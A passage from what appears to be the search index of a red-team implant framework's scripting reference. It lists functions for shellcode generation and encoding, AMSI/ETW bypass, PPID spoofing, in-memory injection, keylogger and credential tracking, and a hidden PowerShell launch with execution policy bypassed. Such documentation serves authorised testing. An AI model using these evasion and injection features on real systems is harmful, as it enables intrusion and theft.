</ul>"},{"location":"IoM/manual/mal/builtin/#donut","title":"donut","text":"<p>Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters </p> <p>Arguments</p> <ul> <li><code>file</code> [string] -  path to PE file</li> <li><code>arch</code> [string] -  architecture, x86/x64</li> <li><code>cmdline</code> [string] -  cmd args</li> </ul>"},{"location":"IoM/manual/mal/builtin/#download_artifact","title":"download_artifact","text":"<p>download artifact with special build id</p> <p>Arguments</p> <ul> <li><code>$1</code> [string] - </li> <li><code>$2</code> [string] - </li> </ul>"},{"location":"IoM/manual/mal/builtin/#exe2shellcode","title":"exe2shellcode","text":"<p>exe to shellcode with donut</p> <p>Arguments</p> <ul> <li><code>bin</code> [table] -  dll bin</li> <li><code>arch</code> [string] -  architecture</li> <li><code>param</code> [string] -  cmd args</li> </ul>"},{"location":"IoM/manual/mal/builtin/#get_artifact","title":"get_artifact","text":"<p>get artifact with session self</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] -  session</li> <li><code>format</code> [string] -  only support shellcode</li> </ul>"},{"location":"IoM/manual/mal/builtin/#search_artifact","title":"search_artifact","text":"<p>search build artifact with arch,os,typ and pipeline id</p> <p>Arguments</p> <ul> <li><code>pipeline</code> [string] -  pipeline id</li> <li><code>type</code> [string] -  build type, beacon,bind,prelude</li> <li><code>format</code> [string] -  only support shellcode</li> <li><code>arch</code> [string] -  arch</li> <li><code>os</code> [string] -  os</li> </ul> <p>Example</p> <pre><code>search_artifact(\"x64\",\"windows\",\"beacon\",\"tcp_default\", true)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#self_artifact","title":"self_artifact","text":"<p>get artifact with session self</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] -  session</li> </ul>"},{"location":"IoM/manual/mal/builtin/#self_payload","title":"self_payload","text":"<p>get self artifact stageless shellcode</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] -  Session</li> </ul> <p>Example</p> <pre><code>self_payload(active())\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#self_stager","title":"self_stager","text":"<p>get self artifact stager shellcode</p> <p>Arguments</p> <ul> <li><code>sess</code> [Session] -  session</li> </ul> <p>Example</p> <pre><code>self_payload(active())\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#sgn_encode","title":"sgn_encode","text":"<p>shellcode encode with sgn</p> <p>Arguments</p> <ul> <li><code>bin</code> [table] -  shellcode bin</li> <li><code>arch</code> [string] -  architecture, x86/x64</li> <li><code>iterations</code> [number] -  sgn iterations</li> </ul>"},{"location":"IoM/manual/mal/builtin/#srdi","title":"srdi","text":"<p>dll/exe to shellcode with srdi</p> <p>Arguments</p> <ul> <li><code>bin</code> [table] -  dll/exe bin</li> <li><code>entry</code> [string] -  entry function for dll</li> <li><code>arch</code> [string] -  architecture, x86/x64</li> <li><code>param</code> [string] -  cmd args</li> </ul>"},{"location":"IoM/manual/mal/builtin/#upload_artifact","title":"upload_artifact","text":"<p>upload local bin to server build</p> <p>Arguments</p> <ul> <li><code>$1</code> [string] - </li> <li><code>$2</code> [string] - </li> <li><code>$3</code> [string] - </li> </ul>"},{"location":"IoM/manual/mal/builtin/#basic","title":"basic","text":""},{"location":"IoM/manual/mal/builtin/#active","title":"active","text":"<p>get current session</p> <p>Example</p> <pre><code>active()\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#add_credential","title":"add_credential","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [Task] </li> <li><code>$3</code> [string] </li> <li><code>$4</code> [any] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#add_download","title":"add_download","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [Task] </li> <li><code>$3</code> [table] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#add_keylogger","title":"add_keylogger","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [Task] </li> <li><code>$3</code> [table] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#add_port","title":"add_port","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [Task] </li> <li><code>$3</code> [table] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#add_screenshot","title":"add_screenshot","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [Task] </li> <li><code>$3</code> [table] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#add_upload","title":"add_upload","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [Task] </li> <li><code>$3</code> [table] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#assemblyprint","title":"assemblyprint","text":"<p>Arguments</p> <ul> <li><code>$1</code> [TaskContext] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#async_run","title":"async_run","text":"<p>Arguments</p> <ul> <li><code>$1</code> [any] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#barch","title":"barch","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#bdata","title":"bdata","text":"<p>get session custom data</p> <p>Arguments</p> <ul> <li><code>$1</code> [Session] - </li> </ul> <p>Example</p> <pre><code>bdata(active())\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#blog","title":"blog","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#broadcast","title":"broadcast","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#callback_append","title":"callback_append","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#callback_bof","title":"callback_bof","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#callback_context","title":"callback_context","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#callback_discard","title":"callback_discard","text":""},{"location":"IoM/manual/mal/builtin/#callback_file","title":"callback_file","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#callback_log","title":"callback_log","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [boolean] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#check_module","title":"check_module","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#console","title":"console","text":""},{"location":"IoM/manual/mal/builtin/#credentials","title":"credentials","text":""},{"location":"IoM/manual/mal/builtin/#curl","title":"curl","text":"<p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>url</code> [string] -  target url</li> <li><code>method</code> [string] -  HTTP method</li> <li><code>timeout</code> [number] -  request timeout in seconds</li> <li><code>body</code> [table] -  request body</li> <li><code>headers</code> [any] -  request headers</li> </ul> <p>Example</p> <pre><code>curl(active(),\"http://example.com\",\"GET\",30,nil,nil)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#data","title":"data","text":"<p>get session data</p> <p>Arguments</p> <ul> <li><code>$1</code> [Session] - </li> </ul> <p>Example</p> <pre><code>data(active())\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#downloads","title":"downloads","text":""},{"location":"IoM/manual/mal/builtin/#execute","title":"execute","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#execute_addon","title":"execute_addon","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [table]  <li><code>$4</code> [boolean] </li> <li><code>$5</code> [number] </li> <li><code>$6</code> [string] </li> <li><code>$7</code> [string] </li> <li><code>$8</code> [SacrificeProcess] </li>"},{"location":"IoM/manual/mal/builtin/#find_global_resource","title":"find_global_resource","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#find_resource","title":"find_resource","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#format_path","title":"format_path","text":"<p>format windows path</p> <p>Arguments</p> <ul> <li><code>s</code> [string] - </li> </ul> <p>Example</p> <pre><code>format_path(\"C:\\\\Windows\\\\System32\\\\calc.exe\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#get","title":"get","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Task] </li> <li><code>$2</code> [number] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#get_sess_dir","title":"get_sess_dir","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#global_resource","title":"global_resource","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#is64","title":"is64","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#is_full_path","title":"is_full_path","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#isactive","title":"isactive","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#isadmin","title":"isadmin","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#isbeacon","title":"isbeacon","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#keyloggers","title":"keyloggers","text":""},{"location":"IoM/manual/mal/builtin/#list_addon","title":"list_addon","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#list_module","title":"list_module","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#listeners","title":"listeners","text":""},{"location":"IoM/manual/mal/builtin/#load_addon","title":"load_addon","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [string] </li> <li><code>$4</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#log","title":"log","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [boolean] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#new_64_executable","title":"new_64_executable","text":"<p>new x64 process execute binary config</p> <p>Arguments</p> <ul> <li><code>module</code> [string] - </li> <li><code>filename</code> [string] -  path to the binary</li> <li><code>argsStr</code> [string] -  command line arguments</li> <li><code>sacrifice</code> [SacrificeProcess] -  sacrifice process</li> </ul> <p>Example</p> <pre><code>sac = new_sacrifice(123, false, false, false, \"\")\nnew_64_exec = new_64_executable(\"module\", \"filename\", \"args\", sac)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#new_86_executable","title":"new_86_executable","text":"<p>new x86 process execute binary config</p> <p>Arguments</p> <ul> <li><code>module</code> [string] - </li> <li><code>filename</code> [string] -  path to the binary</li> <li><code>argsStr</code> [string] -  command line arguments</li> <li><code>sacrifice</code> [SacrificeProcess] -  sacrifice process</li> </ul> <p>Example</p> <pre><code>sac = new_sacrifice(123, false, false, false, \"\")\nnew_86_exec = new_86_executable(\"module\", \"filename\", \"args\", sac)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#new_binary","title":"new_binary","text":"<p>new execute binary config</p> <p>Arguments</p> <ul> <li><code>module</code> [string] - </li> <li><code>filename</code> [string] -  path to the binary</li> <li><code>args</code> [table] -  command line arguments <li><code>output</code> [boolean] - </li> <li><code>timeout</code> [number] - </li> <li><code>arch</code> [string] - </li> <li><code>process</code> [string] - </li> <li><code>sacrifice</code> [SacrificeProcess] -  sacrifice process</li> <p>Example</p> <pre><code>sac = new_sacrifice(123, false, false, false, \"\")\nnew_bin = new_binary(\"module\", \"filename\", \"args\", true, 100, \"amd64\", \"process\", sac)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#new_bypass","title":"new_bypass","text":"<p>new bypass options</p> <p>Arguments</p> <ul> <li><code>bypassAMSI</code> [boolean] - </li> <li><code>bypassETW</code> [boolean] - </li> <li><code>bypassWLDP</code> [boolean] - </li> </ul> <p>Example</p> <pre><code>params = new_bypass(true, true, true)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#new_bypass_all","title":"new_bypass_all","text":"<p>new bypass all options</p> <p>Example</p> <pre><code>params = new_bypass_all()\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#new_sacrifice","title":"new_sacrifice","text":"<p>new sacrifice process config</p> <p>Arguments</p> <ul> <li><code>ppid</code> [number] -  parent process id</li> <li><code>hidden</code> [boolean] - </li> <li><code>blockDll</code> [boolean] - </li> <li><code>disableETW</code> [boolean] - </li> <li><code>argue</code> [string] -  arguments</li> </ul> <p>Example</p> <pre><code>sac = new_sacrifice(123, false, false, false, \"\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#notify","title":"notify","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#pack_binary","title":"pack_binary","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#pack_bof","title":"pack_bof","text":"<p>pack bof single argument</p> <p>Arguments</p> <ul> <li><code>format</code> [string] - </li> <li><code>arg</code> [string] - </li> </ul> <p>Example</p> <pre><code>pack_bof(\"Z\", \"aa\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#pack_bof_args","title":"pack_bof_args","text":"<p>pack bof arguments</p> <p>Arguments</p> <ul> <li><code>format</code> [string] - </li> <li><code>args</code> [table] -  <p>Example</p> <pre><code>pack_bof_args(\"ZZ\", {\"aa\", \"bb\"})\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#pipe_close","title":"pipe_close","text":"<p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>name</code> [string] -  name of the pipe</li> </ul> <p>Example</p> <pre><code>pipe_close(active(), \"pipe_name\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#pipe_upload_raw","title":"pipe_upload_raw","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#pipelines","title":"pipelines","text":""},{"location":"IoM/manual/mal/builtin/#pivots","title":"pivots","text":""},{"location":"IoM/manual/mal/builtin/#ports","title":"ports","text":""},{"location":"IoM/manual/mal/builtin/#read_global_resource","title":"read_global_resource","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#read_resource","title":"read_resource","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#reg_list_value","title":"reg_list_value","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#rem_link","title":"rem_link","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#run","title":"run","text":"<p>Arguments</p> <ul> <li><code>$1</code> [any] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#screenshots","title":"screenshots","text":""},{"location":"IoM/manual/mal/builtin/#script_resource","title":"script_resource","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#sessions","title":"sessions","text":""},{"location":"IoM/manual/mal/builtin/#shellsplit","title":"shellsplit","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#taskprint","title":"taskprint","text":"<p>Arguments</p> <ul> <li><code>$1</code> [TaskContext] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#timestamp_format","title":"timestamp_format","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#uploadraw","title":"uploadraw","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [string] </li> <li><code>$4</code> [string] </li> <li><code>$5</code> [boolean] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#uploads","title":"uploads","text":""},{"location":"IoM/manual/mal/builtin/#wait","title":"wait","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Task] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#with_context","title":"with_context","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#with_value","title":"with_value","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/builtin/#with_values","title":"with_values","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [table]"},{"location":"IoM/manual/mal/builtin/#client","title":"client","text":""},{"location":"IoM/manual/mal/builtin/#addon_completer","title":"addon_completer","text":""},{"location":"IoM/manual/mal/builtin/#all_pipeline_completer","title":"all_pipeline_completer","text":""},{"location":"IoM/manual/mal/builtin/#artifact_completer","title":"artifact_completer","text":""},{"location":"IoM/manual/mal/builtin/#artifact_name_completer","title":"artifact_name_completer","text":""},{"location":"IoM/manual/mal/builtin/#bind_args_completer","title":"bind_args_completer","text":"<p>Arguments</p> <ul> <li><code>$1</code> [table] - </li> <li><code>$2</code> [table] - </li> </ul>"},{"location":"IoM/manual/mal/builtin/#bind_flags_completer","title":"bind_flags_completer","text":"<p>Arguments</p> <ul> <li><code>$1</code> [table] - </li> <li><code>$2</code> [any] - </li> </ul>"},{"location":"IoM/manual/mal/builtin/#command","title":"command","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] - </li> <li><code>$2</code> [table] - </li> <li><code>$3</code> [string] - </li> <li><code>$4</code> [string] - </li> </ul>"},{"location":"IoM/manual/mal/builtin/#content_completer","title":"content_completer","text":""},{"location":"IoM/manual/mal/builtin/#example","title":"example","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] - </li> <li><code>$2</code> [string] - </li> </ul>"},{"location":"IoM/manual/mal/builtin/#help","title":"help","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] - </li> <li><code>$2</code> [string] - </li> </ul>"},{"location":"IoM/manual/mal/builtin/#listener_completer","title":"listener_completer","text":""},{"location":"IoM/manual/mal/builtin/#listener_with_pipeline_completer","title":"listener_with_pipeline_completer","text":""},{"location":"IoM/manual/mal/builtin/#module_completer","title":"module_completer","text":""},{"location":"IoM/manual/mal/builtin/#opsec","title":"opsec","text":"<p>Arguments</p> <ul> <li><code>$1</code> [string] - </li> <li><code>$2</code> [number] - </li> </ul>"},{"location":"IoM/manual/mal/builtin/#profile_completer","title":"profile_completer","text":""},{"location":"IoM/manual/mal/builtin/#rem_agent_completer","title":"rem_agent_completer","text":""},{"location":"IoM/manual/mal/builtin/#rem_completer","title":"rem_completer","text":""},{"location":"IoM/manual/mal/builtin/#resource_completer","title":"resource_completer","text":""},{"location":"IoM/manual/mal/builtin/#session_completer","title":"session_completer","text":""},{"location":"IoM/manual/mal/builtin/#sync_completer","title":"sync_completer","text":""},{"location":"IoM/manual/mal/builtin/#target_completer","title":"target_completer","text":""},{"location":"IoM/manual/mal/builtin/#task_completer","title":"task_completer","text":""},{"location":"IoM/manual/mal/builtin/#type_completer","title":"type_completer","text":""},{"location":"IoM/manual/mal/builtin/#values_completer","title":"values_completer","text":"<p>Arguments</p> <ul> <li><code>$1</code> [table] -"},{"location":"IoM/manual/mal/builtin/#website_completer","title":"website_completer","text":""},{"location":"IoM/manual/mal/builtin/#encode","title":"encode","text":""},{"location":"IoM/manual/mal/builtin/#arg_hex","title":"arg_hex","text":"<p>hexlify encode</p> <p>Arguments</p> <ul> <li><code>input</code> [string] - </li> </ul> <p>Example</p> <pre><code>arg_hex(\"aa\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#base64_decode","title":"base64_decode","text":"<p>base64 decode</p> <p>Arguments</p> <ul> <li><code>input</code> [string] - </li> </ul> <p>Example</p> <pre><code>base64_decode(\"aGVsbG8=\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#base64_encode","title":"base64_encode","text":"<p>Arguments</p> <ul> <li><code>input</code> [string] - </li> </ul> <p>Example</p> <pre><code>base64_encode(\"hello\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#file_exists","title":"file_exists","text":"<p>check file exists</p> <p>Arguments</p> <ul> <li><code>path</code> [string] - </li> </ul> <p>Example</p> <pre><code>file_exists(\"C:\\\\Windows\\\\System32\\\\calc.exe\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#parse_hex","title":"parse_hex","text":"<p>parse hex string to int64</p> <p>Arguments</p> <ul> <li><code>hexString</code> [string] - </li> </ul> <p>Example</p> <pre><code>parse_hex(\"0x1f04\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#parse_octal","title":"parse_octal","text":"<p>parse octal string to int64</p> <p>Arguments</p> <ul> <li><code>octalString</code> [string] - </li> </ul> <p>Example</p> <pre><code>parse_octal(\"0o744\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#random_string","title":"random_string","text":"<p>generate random string</p> <p>Arguments</p> <ul> <li><code>length</code> [number] - </li> </ul> <p>Example</p> <pre><code>random_string(10)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#timestamp","title":"timestamp","text":"<p>Get current timestamp in milliseconds or formatted date string.</p> <p>Example</p> <pre><code>timestampOrFormatted(), timestampOrFormatted(\"01/02 15:04\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#execute_1","title":"execute","text":""},{"location":"IoM/manual/mal/builtin/#bof","title":"bof","text":"<p>COFF Loader,  executes Bof (Windows Only)</p> <p>refactor from https://github.com/hakaioffsec/coffee ,fix a bundle bugs</p> <p>Arguments for the BOF can be passed after the -- delimiter. Each argument must be prefixed with the type of the argument followed by a colon (:). The following types are supported:</p> <ul> <li>str - A null-terminated string</li> <li>wstr - A wide null-terminated string</li> <li>int - A signed 32-bit integer</li> <li>short - A signed 16-bit integer</li> <li>bin - A base64-encoded binary blob</li> </ul> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>bofPath</code> [string] -  path to BOF</li> <li><code>args</code> [table] -  arguments <li><code>output</code> [boolean] -  output</li> <p>Example</p> <pre><code>bof(active(),\"/path/dir.x64.o\",{\"/path/to/list\"},true)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#dllspawn","title":"dllspawn","text":"<p>DllSpawn the given DLL in the sacrifice process</p> <p>use a custom Headless PE loader to load DLL in the sacrificed process.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>dllPath</code> [string] - </li> <li><code>entrypoint</code> [string] - </li> <li><code>args</code> [string] - </li> <li><code>binPath</code> [string] - </li> <li><code>output</code> [boolean] - </li> <li><code>timeout</code> [number] - </li> <li><code>arch</code> [string] - </li> <li><code>process</code> [string] - </li> <li><code>sac</code> [SacrificeProcess] -  sacrifice process</li> </ul> <p>Example</p> <pre><code>dllspawn(active(),\"example.dll\",{},true,60,\"\",\"\",new_sacrifice(1234,false,true,true,\"\"))\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#exec","title":"exec","text":"<p>Execute cmd with powershell</p> <p>equal: powershell.exe -ExecutionPolicy Bypass -w hidden -nop \"[cmdline]\"</p> <p>Arguments</p> <ul> <li><code>sessions</code> [Session] - </li> <li><code>cmd</code> [string] - </li> <li><code>realtime</code> [boolean] - </li> <li><code>output</code> [boolean] - </li> </ul> <p>Example</p> <pre><code>exec(active(),`whoami`,true)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#execute_assembly","title":"execute_assembly","text":"<p>Loads and executes a .NET assembly in implant process (Windows Only)</p> <p>Load CLR assembly in sacrifice process (with donut)</p> <p>Arguments</p> <ul> <li><code>sessions</code> [Session] - </li> <li><code>path</code> [string] - </li> <li><code>args</code> [table] -  <li><code>output</code> [boolean] - </li> <li><code>param, bypass amsi,wldp,etw</code> [any] - </li> <li><code>sac, sacrifice process</code> [SacrificeProcess] - </li> <p>Example</p> <pre><code>execute_assembly(active(),\"sharp.exe\",{}, true, new_bypass_all(), new_sacrifice(1234,false,true,true,\"\"))\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#execute_dll","title":"execute_dll","text":"<p>Executes the given DLL in the sacrifice process</p> <p>use a custom Headless PE loader to load DLL in the sacrificed process.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>dllPath</code> [string] - </li> <li><code>entrypoint</code> [string] - </li> <li><code>args</code> [table] -  <li><code>binPath</code> [string] - </li> <li><code>output</code> [boolean] - </li> <li><code>timeout</code> [number] - </li> <li><code>arch</code> [string] - </li> <li><code>process</code> [string] - </li> <li><code>sac</code> [SacrificeProcess] -  sacrifice process</li> <p>Example</p> <pre><code>execute_dll(active(),\"example.dll\",{},true,60,\"\",\"\",new_sacrifice(1234,false,true,true,\"\"))\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#execute_exe","title":"execute_exe","text":"<p>Executes the given PE in the sacrifice process</p> <p>use a custom Headless PE loader to load EXE in the sacrificed process.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>pePath</code> [string] -  PE file</li> <li><code>args</code> [table] -  PE args <li><code>output</code> [boolean] - </li> <li><code>timeout</code> [number] - </li> <li><code>arch</code> [string] - </li> <li><code>process</code> [string] - </li> <li><code>sac</code> [SacrificeProcess] -  sacrifice process</li> <p>Example</p> <pre><code>execute_exe(active(),\"/path/to/gogo.exe\",{\"-i\",\"127.0.0.1\"},true,60,\"\",\"\",new_sacrifice(1234,false,true,true,\"\"))\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#execute_local","title":"execute_local","text":"<p>Execute local PE on sacrifice process</p> <p>Execute local PE on sacrifice process, support spoofing process arguments, spoofing ppid, block-dll, disable etw</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>args</code> [table] -  arguments <li><code>output</code> [boolean] - </li> <li><code>process</code> [string] - </li> <li><code>sacrifice</code> [SacrificeProcess] -  sacrifice process</li> <p>Example</p> <pre><code>execute_local(active(),{\"-i\",\"127.0.0.1\",\"-p\",\"top2\"},true,\"gogo.exe\",new_sacrifice(1234,false,true,true,\"argue\"))\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#execute_shellcode","title":"execute_shellcode","text":"<p>Executes the given shellcode in the sacrifice process</p> <p>The current shellcode injection method uses APC.</p> <p>In the future, configurable shellcode injection settings will be provided, along with Donut, SGN, SRDI, etc.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>shellcodePath</code> [string] -  path to shellcode</li> <li><code>args</code> [table] -  arguments <li><code>output</code> [boolean] - </li> <li><code>timeout</code> [number] - </li> <li><code>arch</code> [string] - </li> <li><code>process</code> [string] - </li> <li><code>sac</code> [SacrificeProcess] -  sacrifice process</li> <p>Example</p> <pre><code>execute_shellcode(active(), \"/path/to/shellcode\", {}, true, 60, \"x64\", \"\",new_sacrifice(1234,false,true,true)\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#inline_assembly","title":"inline_assembly","text":"<p>Loads and inline execute a .NET assembly (Windows Only)</p> <p>Load CLR assembly in implant process(will not create new process)</p> <p>if return 0x80004005, please use --amsi bypass.</p> <p>Arguments</p> <ul> <li><code>sessions</code> [Session] - </li> <li><code>path</code> [string] - </li> <li><code>args</code> [table] -  <li><code>output</code> [boolean] - </li> <li><code>bypass_params</code> [any] - </li> <p>Example</p> <pre><code>inline_assembly(active(),\"seatbelt.exe\",{},true,new_bypass_all())\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#inline_dll","title":"inline_dll","text":"<p>Executes the given inline DLL in the current process</p> <p>use a custom Headless PE loader to load DLL in the current process.</p> <p>\"instability warning!!!</p> <p>inline execute dll may cause the implant to crash, please use with caution.</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>path</code> [string] - </li> <li><code>entryPoint</code> [string] - </li> <li><code>args</code> [table] -  <li><code>output</code> [boolean] - </li> <li><code>timeout</code> [number] - </li> <li><code>arch</code> [string] - </li> <li><code>process</code> [string] - </li> <p>Example</p> <pre><code>inline_dll(active(),\"example.dll\",\"\",{\"arg1\",\"arg2\"},true,60,\"\",\"\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#inline_exe","title":"inline_exe","text":"<p>Executes the given inline EXE in current process</p> <p>use a custom Headless PE loader to load EXE in the current process.</p> <p>\"instability warning!!!</p> <p>inline execute exe may cause the implant to crash, please use with caution.</p> <p>if double run same exe, More likely to crash</p> <p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>path</code> [string] -  PE file</li> <li><code>args</code> [table] -  PE args <li><code>output</code> [boolean] - </li> <li><code>timeout</code> [number] - </li> <li><code>arch</code> [string] - </li> <li><code>process</code> [string] - </li> <p>Example</p> 